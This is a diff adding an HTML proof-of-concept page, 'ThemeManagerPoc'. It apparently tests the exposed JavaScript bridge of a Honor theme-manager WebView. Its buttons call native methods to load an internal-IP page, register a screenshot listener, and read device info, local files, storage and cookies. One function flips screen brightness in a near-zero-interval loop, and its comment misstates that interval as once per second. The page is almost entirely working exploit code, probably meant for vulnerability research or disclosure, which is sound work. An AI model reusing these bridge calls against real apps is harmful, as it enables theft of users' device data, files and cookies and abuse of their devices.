@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ThemeManagerPoc</title>
+    <script type="text/javascript">
+        function handlePushWebViewCallback(requestId, resultCode, data) {
+            alert("Request ID: " + JSON.stringify(requestId));
+            alert("Result Code: " + resultCode);
+            alert("Data: " + data);
+            alert(JSON.stringify(data));
+
+            if (resultCode === 0) {
+                alert("Success: " + data);
+            } else {
+                alert("Error: " + data);
+            }
+        }
+
+
+        function callPushWebView() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.OtherMethods";
+            var operationName = "pushWebView";
+            var uri = "http://100.64.3.203/files/list_objects.html";
+            var encodedUri = encodeURIComponent(uri);
+            var params = JSON.stringify({ uri: encodedUri });
+            var requestId = "12345";
+            var callback = "handlePushWebViewCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+
+
+        function handleScreenShotCallback(callbackId, eventType, data, d, e) {
+            alert("Callback ID: " + JSON.stringify(callbackId) + "\nEvent Type: " + eventType + "\nData: " + JSON.stringify(data));
+        }
+
+        function callRegisterScreenShotListener() {
+            var eventTypes = ["onScreenShot"];
+            var callbackInfo = {
+                callbackMethod: "handleScreenShotCallback",
+                callbackId: "12345"
+            };
+            var params = {
+                eventTypes: eventTypes,
+                callbackInfo: callbackInfo
+            };
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod("com.hihonor.hm.h5.container.js.method.OtherMethods", "registerListener", JSON.stringify(params), "12345", "handleScreenShotCallback");
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+
+
+
+        function callGetPluginInfo() {
+            var pluginId = 1;
+            var clazz = "com.hihonor.hm.h5.container.js.method.OtherMethods";
+            var operationName = "getPluginInfo";
+            var params = JSON.stringify({ pluginId: pluginId });
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+
+        function callGetAppDeviceInfo() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.DeviceMethods";
+            var operationName = "getAppDeviceInfo";
+            var params = JSON.stringify({ adc: "abc" });
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+    
+        function callSetScreenBrightness() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.DeviceMethods";
+            var operationName = "setScreenBrightness";
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+        
+            // 定义一个变量来跟踪当前亮度状态
+            var brightness = -1; // 初始亮度为 -1
+        
+            // 使用一个定时器来不断切换亮度
+            setInterval(function() {
+                // 切换亮度
+                brightness = (brightness === -1) ? 1 : -1; // 在 -1 和 1 之间切换
+                var params = JSON.stringify({ brightness: brightness });
+        
+                if (window.Native && typeof window.Native.nativeMethod === "function") {
+                    window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+                } else {
+                    alert("Native interface is not available.");
+                }
+            }, 0.01); // 每秒切换一次亮度
+        }
+
+        function callGetLocalFiles() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.FileMethods";
+            var operationName = "getLocalFiles";
+            var brightness = 999;
+            var params = JSON.stringify({ brightness: brightness });
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+
+        function callSetStorage() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.CacheMethods";
+            var operationName = "setStorage";
+            var params = JSON.stringify({ key1: "qnsjsandnajk", key2: "dwqdsadjerk" });
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+        function callGetStorage() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.CacheMethods";
+            var operationName = "getStorage";
+            var params = JSON.stringify({ key: "key" });
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+        function callClearStorage() {
+            var clazz = "com.hihonor.hm.h5.container.js.method.CacheMethods";
+            var operationName = "clearStorage";
+            var params = JSON.stringify({ key: "key1" });
+            var requestId = "12345";
+            var callback = "handleScreenShotCallback";
+
+            if (window.Native && typeof window.Native.nativeMethod === "function") {
+                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
+            } else {
+                alert("Native interface is not available.");
+            }
+        }
+
+
+        function getCookie() {
+            var params = JSON.stringify({ callback: "handleScreenShotCallback" });
+            var requestId = "12345";
+
+            if (window.cookieStore && typeof window.cookieStore.getAll === "function") {
+                window.cookieStore.getAll(params);
+            } else {
+                alert("cookieStore interface is not available.");
+            }
+        }
+
+
+
+    </script>
+</head>
+<body>
+    <h1>ThemeManagerPoc</h1>
+    <button onclick="callPushWebView()">callPushWebView</button>
+    <button onclick="callRegisterScreenShotListener()">callRegisterScreenShotListener</button>
+    <button onclick="callGetPluginInfo()">callGetPluginInfo</button>
+    <button onclick="callGetAppDeviceInfo()">callGetAppDeviceInfo</button>
+    <button onclick="callSetScreenBrightness()">callSetScreenBrightness</button>
+    <button onclick="callGetLocalFiles()">callGetLocalFiles</button>
+    <button onclick="callSetStorage()">callSetStorage</button>
+    <button onclick="callGetStorage()">callGetStorage</button>
+    <button onclick="callClearStorage()">callClearStorage</button>
+    <button onclick="getCookie()">getCookie</button>
+</body>
+</html>
